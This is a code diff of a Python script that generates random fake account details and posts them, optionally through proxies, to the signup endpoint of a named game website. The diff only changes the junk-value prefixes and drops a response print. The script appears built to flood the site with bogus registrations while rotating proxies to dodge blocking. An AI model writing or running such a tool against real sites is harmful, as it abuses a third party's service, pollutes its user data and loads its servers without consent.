@@ -17,12 +17,12 @@ def randomPayload():
         return ''.join(random.choice(letters_and_digits) for i in range(length))
 
     return {
-        'kawaidinda': 'la' + random_string(4),
-        'username': 'user' + random_string(5),
-        'email': 'user_' + random_string(5) + '@gmail.local',
+        'kawaidinda': 'bapr' + random_string(4),
+        'username': 'baperan' + random_string(5),
+        'email': 'gmkokbaper' + random_string(5) + '@localhost.root',
         'DiscordName': 'lumibaper#' + str(random.randint(1000, 9999)),
         'LoliMoncrottUhaHH': 'IoriYagami',
-        'password': 'pass_' + random_string(4) + '#' + random_string(4)
+        'password': 'gmbaper' + random_string(4) + '#' + random_string(4)
     }
 
 def makeRequest(proxies):
@@ -39,8 +39,6 @@ def makeRequest(proxies):
             r = requests.post('http://aslantia.lost-saga.my.id/fungsional/DRejisterSlurrr.php', headers=headers, data=payload, timeout=10)
         else:
             r = requests.post('http://aslantia.lost-saga.my.id/fungsional/DRejisterSlurrr.php', headers=headers, data=payload, timeout=10, proxies=proxies)
-
-        print(r.text)
 
         if "Berhasil Mendaftarkan Akun. Silahkan Login..." in r.text:
             print("Account registration successful. Please log in.")
